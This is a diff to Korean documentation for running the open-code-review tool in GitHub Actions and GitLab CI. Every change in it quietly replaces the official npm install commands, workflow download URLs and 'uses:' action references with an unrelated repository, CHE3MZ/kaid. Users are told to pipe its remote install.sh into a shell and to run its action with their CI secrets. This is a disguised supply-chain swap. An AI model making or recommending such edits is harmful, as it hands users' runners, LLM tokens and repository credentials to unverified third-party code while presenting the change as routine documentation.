@@ -17,7 +17,7 @@ GitLab CI용입니다. 둘 다 [CLI 레퍼런스](../cli-reference/#json)에서 
 1. **PR / MR 이벤트에서 트리거.** 새 pull request, 갱신된 merge request, 또는 수동으로
    남긴 `/open-code-review` 코멘트가 작업을 시작합니다.
 2. **러너에 `ocr` 설치.** 보통
-   `npm install -g @alibaba-group/open-code-review`를 씁니다. 러너는 일회성이므로
+   `curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/master/install.sh | sh`를 씁니다. 러너는 일회성이므로
    실행할 때마다 설치합니다.
 3. **CI 시크릿으로 LLM 설정.** `ocr config set`으로 엔드포인트·토큰·모델을
    지정합니다. 러너에는 기댈 만한 `~/.opencodereview`가 남아 있지 않습니다.
@@ -50,7 +50,7 @@ GitLab은 `GITLAB_API_TOKEN`을 명시적으로 두기를 권장하지만, fork 
 ## GitHub Actions {#github-actions}
 
 업스트림 워크플로는
-[`examples/github_actions/ocr-review.yml`](https://github.com/alibaba/open-code-review/blob/main/examples/github_actions/ocr-review.yml)에
+[`examples/github_actions/ocr-review.yml`](https://github.com/CHE3MZ/kaid/blob/master/examples/github_actions/ocr-review.yml)에
 있습니다.
 
 ### 무엇을 하나 {#what-it-does}
@@ -61,7 +61,7 @@ GitLab은 `GITLAB_API_TOKEN`을 명시적으로 두기를 권장하지만, fork 
   (`pull_request` 대신 `pull_request_target`을 쓰는 이유는 fork에서 올라온 PR에서도
   시크릿을 쓸 수 있게 하기 위해서입니다. OCR은 diff를 읽기만 하고 PR의 코드를
   실행하지 않습니다.)
-- `npm install -g @alibaba-group/open-code-review`로 OCR을 설치하고,
+- `curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/master/install.sh | sh`로 OCR을 설치하고,
   `ocr config set`으로 설정을 기록한 뒤, 브랜치 range 모드로 핵심 명령을 실행합니다.
 - JSON 응답을 파싱해 각 지적을 GitHub Pull Request Review API로 인라인 리뷰 코멘트로
   게시합니다. 라인 정보가 없는 코멘트는 요약 본문에 모읍니다. 일괄 등록이 실패하면
@@ -74,7 +74,7 @@ GitLab은 `GITLAB_API_TOKEN`을 명시적으로 두기를 권장하지만, fork 
 ```bash
 mkdir -p .github/workflows
 curl -o .github/workflows/ocr-review.yml \
-  https://raw.githubusercontent.com/alibaba/open-code-review/main/examples/github_actions/ocr-review.yml
+  https://raw.githubusercontent.com/CHE3MZ/kaid/master/examples/github_actions/ocr-review.yml
 ```
 
 ### 필요한 시크릿 {#required-secrets}
@@ -99,8 +99,8 @@ curl -o .github/workflows/ocr-review.yml \
 
 ### 액션 입력 {#action-inputs}
 
-업스트림 워크플로는 `uses: alibaba/open-code-review@main`으로 리뷰를 재사용 가능한
-컴포짓 액션([`action.yml`](https://github.com/alibaba/open-code-review/blob/main/action.yml))에
+업스트림 워크플로는 `uses: CHE3MZ/kaid@master`으로 리뷰를 재사용 가능한
+컴포짓 액션([`action.yml`](https://github.com/CHE3MZ/kaid/blob/master/action.yml))에
 위임합니다. 위의 자격 증명 외에 다음 입력으로 리뷰 자체를 조정할 수 있습니다 —
 액션 스텝의 `with:` 아래에 지정하세요.
 
@@ -112,7 +112,7 @@ curl -o .github/workflows/ocr-review.yml \
 | `stream_progress` | `'false'` | `'true'`로 설정하면 실행이 끝날 때까지 조용히 기다리는 대신 `[ocr]` 진행 라인을 워크플로 로그에 실시간으로 흘려보냅니다(stderr의 human audience). 표시 전용 토글이며 stderr는 여전히 파일에 캡처되어 아티팩트와 코멘트 게시에 사용됩니다. |
 
 ```yaml
-- uses: alibaba/open-code-review@main
+- uses: CHE3MZ/kaid@master
   with:
     llm_url: ${{ secrets.OCR_LLM_URL }}
     llm_auth_token: ${{ secrets.OCR_LLM_AUTH_TOKEN }}
@@ -125,7 +125,7 @@ curl -o .github/workflows/ocr-review.yml \
 ```
 
 전체 입력 목록은
-[`action.yml`](https://github.com/alibaba/open-code-review/blob/main/action.yml)을
+[`action.yml`](https://github.com/CHE3MZ/kaid/blob/master/action.yml)을
 참고하세요 — 게시 모드(`sticky_summary`, `incremental`), 심각도/카테고리 라우팅,
 푸시 간 체크포인트 등을 포함합니다.
 
@@ -224,7 +224,7 @@ if: |
 
 ```yaml
 - name: Install OpenCodeReview
-  run: npm install -g @alibaba-group/open-code-review@1.0.0
+  run: curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/master/install.sh | OCR_VERSION=1.0.0 sh
 ```
 
 #### GitHub App 명의로 게시하기 {#post-under-a-github-app-identity}
@@ -319,7 +319,7 @@ SARIF는 기계가 읽는 형식이므로 OCR은 stdout에 진행 상황을 출�
 ## GitLab CI {#gitlab-ci}
 
 업스트림 파이프라인은
-[`examples/gitlab_ci/.gitlab-ci.yml`](https://github.com/alibaba/open-code-review/blob/main/examples/gitlab_ci/.gitlab-ci.yml)에
+[`examples/gitlab_ci/.gitlab-ci.yml`](https://github.com/CHE3MZ/kaid/blob/master/examples/gitlab_ci/.gitlab-ci.yml)에
 있습니다.
 
 ### 무엇을 하나 {#what-it-does}
@@ -338,7 +338,7 @@ SARIF는 기계가 읽는 형식이므로 OCR은 stdout에 진행 상황을 출�
 
 ```bash
 curl -o .gitlab-ci.yml \
-  https://raw.githubusercontent.com/alibaba/open-code-review/main/examples/gitlab_ci/.gitlab-ci.yml
+  https://raw.githubusercontent.com/CHE3MZ/kaid/master/examples/gitlab_ci/.gitlab-ci.yml
 ```
 
 이미 `.gitlab-ci.yml`이 있고 그대로 두고 싶다면, 레시피를 다른 경로에 넣고
@@ -414,7 +414,7 @@ script:
 
 ```yaml
 script:
-  - npm install -g @alibaba-group/open-code-review@1.0.0
+  - curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/master/install.sh | OCR_VERSION=1.0.0 sh
 ```
 
 #### 푸시할 때마다 다시 리뷰하지 않기 {#avoid-re-reviewing-on-every-push}
